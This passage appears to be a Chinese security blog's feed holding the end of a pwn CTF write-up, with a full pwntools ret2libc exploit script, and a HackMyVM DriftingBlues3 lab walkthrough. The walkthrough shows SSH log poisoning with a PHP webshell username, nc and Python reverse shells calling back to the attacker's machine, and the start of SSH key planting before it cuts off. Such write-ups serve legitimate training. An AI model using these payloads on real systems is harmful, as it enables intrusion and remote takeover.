class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">return</span> p.recvuntil(data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">return</span> p.send(data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">return</span> p.sendline(data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">delim, data</span>):</span><br><span class="line">    <span class="keyword">return</span> p.sendlineafter(delim, data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inter</span>():</span><br><span class="line">    <span class="keyword">return</span> p.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_libc64</span>():</span><br><span class="line">    <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_libc32</span>():</span><br><span class="line">     <span class="keyword">return</span> u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_sb</span>():</span><br><span class="line">    <span class="keyword">return</span> (libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>], libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>)))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">li</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&quot;/root/glibc-all-in-one/libs/2.31-0ubuntu9.18_i386/libc.so.6&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.31.so&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./account&#x27;</span>)</span><br><span class="line">file_name = <span class="string">&#x27;./account&#x27;</span></span><br><span class="line"></span><br><span class="line">debug_mode = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug_mode:</span><br><span class="line">    p = remote(<span class="string">&#x27;pss.idss-cn.com&#x27;</span>,<span class="number">22661</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(file_name)</span><br><span class="line">rl(<span class="string">b&#x27;exit:&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">14</span>):</span><br><span class="line">    sl(<span class="built_in">str</span>(<span class="number">0xa</span>))</span><br><span class="line"></span><br><span class="line">sl(<span class="built_in">str</span>(elf.plt[<span class="string">&#x27;puts&#x27;</span>])) </span><br><span class="line">sl(<span class="built_in">str</span>(elf.sym[<span class="string">&#x27;main&#x27;</span>]))</span><br><span class="line">sl(<span class="built_in">str</span>(elf.got[<span class="string">&#x27;puts&#x27;</span>]))</span><br><span class="line">sl(<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line"><span class="comment">#libc_base = get_libc32() - 0x6dc40</span></span><br><span class="line">libc_base = get_libc32() - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">li(<span class="string">f&#x27;libc base: <span class="subst">&#123;<span class="built_in">hex</span>(libc_base)&#125;</span>&#x27;</span>)</span><br><span class="line">system,binsh = get_sb()</span><br><span class="line">li(<span class="built_in">hex</span>(system))</span><br><span class="line">li(<span class="built_in">hex</span>(binsh))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">14</span>):</span><br><span class="line">    sl(<span class="built_in">str</span>(<span class="number">0xa</span>))</span><br><span class="line">sl(<span class="built_in">str</span>(system - <span class="number">0x100000000</span>)) </span><br><span class="line">sl(<span class="built_in">str</span>(elf.sym[<span class="string">&#x27;main&#x27;</span>]))</span><br><span class="line">sl(<span class="built_in">str</span>(binsh - <span class="number">0x100000000</span>))</span><br><span class="line">sl(<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">inter()</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2025/png/45119733/1754477700277-c8f6c777-0621-48ca-adf1-b4c92192ba3e.png"></p>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hackmyvm-Driftingblues3</title>
      <link href="/2025/08/08/hackmyvm-Driftingblues3/"/>
      <url>/2025/08/08/hackmyvm-Driftingblues3/</url>
      
        <content type="html"><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>先用 <code>nmap</code> 扫描目标开放端口：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ nmap -A 192.168.56.114</span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-08 05:15 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.56.114 (192.168.56.114)</span><br><span class="line">Host is up (0.0015s latency).</span><br><span class="line">Not shown: 998 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 6a:fe:d6:17:23:cb:90:79:2b:b1:2d:37:53:97:46:58 (RSA)</span><br><span class="line">|   256 5b:c4:68:d1:89:59:d7:48:b0:96:f3:11:87:1c:08:ac (ECDSA)</span><br><span class="line">|_  256 61:39:66:88:1d:8f:f1:d0:40:61:1e:99:c5:1a:1f:f4 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.38 ((Debian))</span><br><span class="line">| http-robots.txt: 1 disallowed entry </span><br><span class="line">|_/eventadmins</span><br><span class="line">|_http-title: Site doesn<span class="string">&#x27;t have a title (text/html).</span></span><br><span class="line"><span class="string">|_http-server-header: Apache/2.4.38 (Debian)</span></span><br><span class="line"><span class="string">MAC Address: 08:00:27:2C:69:FE (PCS Systemtechnik/Oracle VirtualBox virtual NIC)</span></span><br><span class="line"><span class="string">Device type: general purpose|router</span></span><br><span class="line"><span class="string">Running: Linux 4.X|5.X, MikroTik RouterOS 7.X</span></span><br><span class="line"><span class="string">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3</span></span><br><span class="line"><span class="string">OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)</span></span><br><span class="line"><span class="string">Network Distance: 1 hop</span></span><br><span class="line"><span class="string">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">TRACEROUTE</span></span><br><span class="line"><span class="string">HOP RTT     ADDRESS</span></span><br><span class="line"><span class="string">1   1.49 ms 192.168.56.114 (192.168.56.114)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">OS and Service detection performed. Please report any incorrec</span></span><br></pre></td></tr></table></figure><p>只有 <strong>22(SSH)</strong> 和 <strong>80(HTTP)</strong> 开放。</p><p>用 <code>gobuster</code> 枚举 Web 目录：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ gobuster <span class="built_in">dir</span> -u http://192.168.56.114/ -w /usr/share/wordlists/dirb/common.txt -x php,txt -t 50</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.6</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://192.168.56.114/</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 50</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirb/common.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.6</span><br><span class="line">[+] Extensions:              php,txt</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">Starting gobuster <span class="keyword">in</span> directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/.hta.txt             (Status: 403) [Size: 279]</span><br><span class="line">/.htaccess.txt        (Status: 403) [Size: 279]</span><br><span class="line">/.htpasswd            (Status: 403) [Size: 279]</span><br><span class="line">/.htpasswd.txt        (Status: 403) [Size: 279]</span><br><span class="line">/.php                 (Status: 403) [Size: 279]</span><br><span class="line">/.hta                 (Status: 403) [Size: 279]</span><br><span class="line">/.htaccess            (Status: 403) [Size: 279]</span><br><span class="line">/.hta.php             (Status: 403) [Size: 279]</span><br><span class="line">/.htaccess.php        (Status: 403) [Size: 279]</span><br><span class="line">/.htpasswd.php        (Status: 403) [Size: 279]</span><br><span class="line">/drupal               (Status: 301) [Size: 317] [--&gt; http://192.168.56.114/drupal/]</span><br><span class="line">/index.html           (Status: 200) [Size: 1373]</span><br><span class="line">/Makefile             (Status: 200) [Size: 11]</span><br><span class="line">/MANIFEST.MF          (Status: 200) [Size: 11]</span><br><span class="line">/phpmyadmin           (Status: 301) [Size: 321] [--&gt; http://192.168.56.114/phpmyadmin/]</span><br><span class="line">/privacy              (Status: 301) [Size: 318] [--&gt; http://192.168.56.114/privacy/]</span><br><span class="line">/robots.txt           (Status: 200) [Size: 37]</span><br><span class="line">/robots.txt           (Status: 200) [Size: 37]</span><br><span class="line">/secret               (Status: 301) [Size: 317] [--&gt; http://192.168.56.114/secret/]</span><br><span class="line">/server-status        (Status: 403) [Size: 279]</span><br><span class="line">/wp-admin             (Status: 301) [Size: 319] [--&gt; http://192.168.56.114/wp-admin/]</span><br><span class="line">Progress: 13842 / 13845 (99.98%)</span><br><span class="line">===============================================================</span><br><span class="line">Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ curl 192.168.56.114/robots.txt</span><br><span class="line">User-agent: *</span><br><span class="line">Disallow: /eventadmins                                                                                   </span><br><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ curl http://192.168.56.114/eventadmins/</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;p&gt;man there<span class="string">&#x27;s a problem with ssh&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;p&gt;john said &quot;it&#x27;</span>s poisonous!!! stay away!!!<span class="string">&quot;&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;p&gt;idk if he&#x27;s mentally challenged&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;p&gt;please find and fix it&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;p&gt;also check /littlequeenofspades.html&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;p&gt;your buddy, buddyG&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt; </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">┌──(kali㉿kali)-[~/Desktop]</span></span><br><span class="line"><span class="string">└─$ curl http://192.168.56.114/littlequeenofspades.html</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">&lt;p&gt;Now, she is a little queen of spades, and the men will not let her be                                &lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;p&gt;Mmmm, she is the little queen of spades, and the men will not let her be             &lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;p&gt;Everytime she makes a spread, hoo fair brown, cold chill just runs all over me       &lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;p&gt;I&#x27;m gon&#x27; get me a gamblin&#x27; woman, if the last thing that I do                        &lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;p&gt;Eee, gon&#x27; get me a gamblin&#x27; woman, if it&#x27;s the last thing that I do                  &lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;p&gt;Well, a man don&#x27;t need a woman, ooh fair brown, that he got to give all his money to &lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;p&gt;Everybody say she got a mojo, now she&#x27;s been usin&#x27; that stuff                        &lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;p&gt;Mmmm, mmmm, &#x27;verybody says she got a mojo, &#x27;cause she been usin&#x27; that stuff          &lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;p&gt;But she got a way trimmin&#x27; down, hoo fair brown, and I mean it&#x27;s most too tough      &lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;p&gt;Now, little girl, since I am the king, baby, and you is a queen                      &lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;p&gt;Ooo eee, since I am the king baby, and you is a queen                                &lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;p&gt;Le&#x27;s us put our heads together, hoo fair brown, then we can make our money green     &lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;p style=&quot;</span>color:white<span class="string">&quot;&gt;aW50cnVkZXI/IEwyRmtiV2x1YzJacGVHbDBMbkJvY0E9PQ==&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt; </span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ <span class="built_in">echo</span> <span class="string">&quot;aW50cnVkZXI/IEwyRmtiV2x1YzJacGVHbDBMbkJvY0E9PQ==&quot;</span> | <span class="built_in">base64</span></span><br><span class="line">YVc1MGNuVmtaWEkvSUV3eVJtdGlWMngxWXpKYWNHVkhiREJNYmtKdlkwRTlQUT09Cg==</span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ <span class="built_in">echo</span> <span class="string">&quot;aW50cnVkZXI/IEwyRmtiV2x1YzJacGVHbDBMbkJvY0E9PQ==&quot;</span> | <span class="built_in">base64</span> -d</span><br><span class="line">intruder? L2FkbWluc2ZpeGl0LnBocA==                                                                                                                                                  </span><br><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ <span class="built_in">echo</span> <span class="string">&quot;L2FkbWluc2ZpeGl0LnBocA==&quot;</span> | <span class="built_in">base64</span> -d</span><br><span class="line">/adminsfixit.php </span><br></pre></td></tr></table></figure><p>&#x2F;robots.txt -&gt; &#x2F;eventadmins -&gt; &#x2F;littlequeenofspades.html -&gt; 发现一段base64编码 -&gt; &#x2F;adminsfixit.php </p><h2 id="SSH-日志注入"><a href="#SSH-日志注入" class="headerlink" title="SSH 日志注入"></a>SSH 日志注入</h2><p>访问 <code>/adminsfixit.php</code>，发现是一个 SSH 登录日志查看页面。<br>靶机存在 <strong>将用户名直接写入日志文件且网页可读</strong> 的漏洞，可通过设置特殊用户名注入 PHP 代码。  </p><p>利用 <code>msf</code> 的 SSH 爆破模块将用户名设置为 PHP Webshell：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; search ssh_login</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   #  Name                                    Disclosure Date  Rank    Check  Description</span><br><span class="line">   -  ----                                    ---------------  ----    -----  -----------</span><br><span class="line">   0  auxiliary/scanner/ssh/ssh_login         .                normal  No     SSH Login Check Scanner</span><br><span class="line">   1  auxiliary/scanner/ssh/ssh_login_pubkey  .                normal  No     SSH Public Key Login Scanner</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interact with a module by name or index. For example info 1, use 1 or use auxiliary/scanner/ssh/ssh_login_pubkey</span><br><span class="line"></span><br><span class="line">msf6 &gt; use auxiliary/scanner/ssh/ssh_login</span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt; set rhost 192.168.56.114</span><br><span class="line">rhost =&gt; 192.168.56.114</span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt; set username &lt;?php system($_GET[&#x27;a&#x27;]);?&gt;</span><br><span class="line">username =&gt; &lt;?php system($_GET[a]);?&gt;</span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt; set rport 22</span><br><span class="line">rport =&gt; 22</span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt; set password 123</span><br><span class="line">password =&gt; 123</span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (auxiliary/scanner/ssh/ssh_login):</span><br><span class="line"></span><br><span class="line">   Name              Current Setting            Required  Description</span><br><span class="line">   ----              ---------------            --------  -----------</span><br><span class="line">   ANONYMOUS_LOGIN   false                      yes       Attempt to login with a blank username and password</span><br><span class="line">   BLANK_PASSWORDS   false                      no        Try blank passwords for all users</span><br><span class="line">   BRUTEFORCE_SPEED  5                          yes       How fast to bruteforce, from 0 to 5</span><br><span class="line">   CreateSession     true                       no        Create a new session for every successful login</span><br><span class="line">   DB_ALL_CREDS      false                      no        Try each user/password couple stored in the current database</span><br><span class="line">   DB_ALL_PASS       false                      no        Add all passwords in the current database to the list</span><br><span class="line">   DB_ALL_USERS      false                      no        Add all users in the current database to the list</span><br><span class="line">   DB_SKIP_EXISTING  none                       no        Skip existing credentials stored in the current database (Accepted: none, user, user&amp;r</span><br><span class="line">                                                          ealm)</span><br><span class="line">   PASSWORD          123                        no        A specific password to authenticate with</span><br><span class="line">   PASS_FILE                                    no        File containing passwords, one per line</span><br><span class="line">   RHOSTS            192.168.56.114             yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using</span><br><span class="line">                                                          -metasploit.html</span><br><span class="line">   RPORT             22                         yes       The target port</span><br><span class="line">   STOP_ON_SUCCESS   false                      yes       Stop guessing when a credential works for a host</span><br><span class="line">   THREADS           1                          yes       The number of concurrent threads (max one per host)</span><br><span class="line">   USERNAME          &lt;?php system($_GET[a]);?&gt;  no        A specific username to authenticate as</span><br><span class="line">   USERPASS_FILE                                no        File containing users and passwords separated by space, one pair per line</span><br><span class="line">   USER_AS_PASS      false                      no        Try the username as the password for all users</span><br><span class="line">   USER_FILE                                    no        File containing usernames, one per line</span><br><span class="line">   VERBOSE           false                      yes       Whether to print output for all attempts</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">View the full module info with the info, or info -d command.</span><br><span class="line"></span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt; run</span><br><span class="line">[*] 192.168.56.114:22 - Starting bruteforce</span><br><span class="line">[*] Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure><p>在web页面测试后实现命令执行。</p><h2 id="反弹-Shell"><a href="#反弹-Shell" class="headerlink" title="反弹 Shell"></a>反弹 Shell</h2><p>直接 <code>nc</code> 反弹不稳定，不知道为什么直接断了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[192.168.56.114/adminsfixit.php?a=nc 192.168.56.102 6666 -e sh](http://192.168.56.114/adminsfixit.php?a=nc%20192.168.56.102%206666%20-e%20sh)</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ nc -lvnp 6666</span><br><span class="line">listening on [any] 6666 ...</span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">connect to [192.168.56.102] from (UNKNOWN) [192.168.56.114] 56106</span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ nc -lvnp 6666</span><br><span class="line">listening on [any] 6666 ...</span><br><span class="line">connect to [192.168.56.102] from (UNKNOWN) [192.168.56.114] 56114</span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ nc -lvnp 6666</span><br><span class="line">listening on [any] 6666 ...</span><br><span class="line">connect to [192.168.56.102] from (UNKNOWN) [192.168.56.114] 56130</span><br></pre></td></tr></table></figure><p>改用 Python 反弹 Shell：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);</span><br><span class="line">s.connect((&quot;192.168.56.102&quot;,6666));os.dup2(s.fileno(),0);</span><br><span class="line">os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;sh&quot;)&#x27;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> /home</span><br><span class="line"><span class="built_in">cd</span> /home</span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">lost+found  robertj</span><br><span class="line">$ <span class="built_in">cd</span> robertj</span><br><span class="line"><span class="built_in">cd</span> robertj</span><br><span class="line">$ <span class="built_in">ls</span> -la </span><br><span class="line"><span class="built_in">ls</span> -la</span><br><span class="line">total 16</span><br><span class="line">drwxr-xr-x 3 robertj robertj 4096 Jan  7  2021 .</span><br><span class="line">drwxr-xr-x 4 root    root    4096 Jan  4  2021 ..</span><br><span class="line">drwx---rwx 2 robertj robertj 4096 Jan  4  2021 .ssh</span><br><span class="line">-r-x------ 1 robertj robertj   33 Jan  7  2021 user.txt</span><br></pre></td></tr></table></figure><p>.ssh目录可以写</p><h2 id="SSH-公钥植入"><a href="#SSH-公钥植入" class="headerlink" title="SSH 公钥植入"></a>SSH 公钥植入</h2><p>发现 <code>.ssh</code> 目录 <strong>可写</strong>，可直接植入公钥免密登录：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ ssh-keygen -t rsa -b 4096 -f ~/.ssh/driftingblues3</span><br><span class="line"></span><br><span class="line">Generating public/private rsa key pair.</span><br><span class="line">Enter passphrase <span class="keyword">for</span> <span class="string">&quot;/home/kali/.ssh/driftingblues3&quot;</span> (empty <span class="keyword">for</span> no passphrase): </span><br><span class="line">Enter same passphrase again: </span><br><span class="line">Your identification has been saved <span class="keyword">in</span> /home/kali/.ssh/driftingblues3</span><br><span class="line">Your public key has been saved <span class="keyword">in</span> 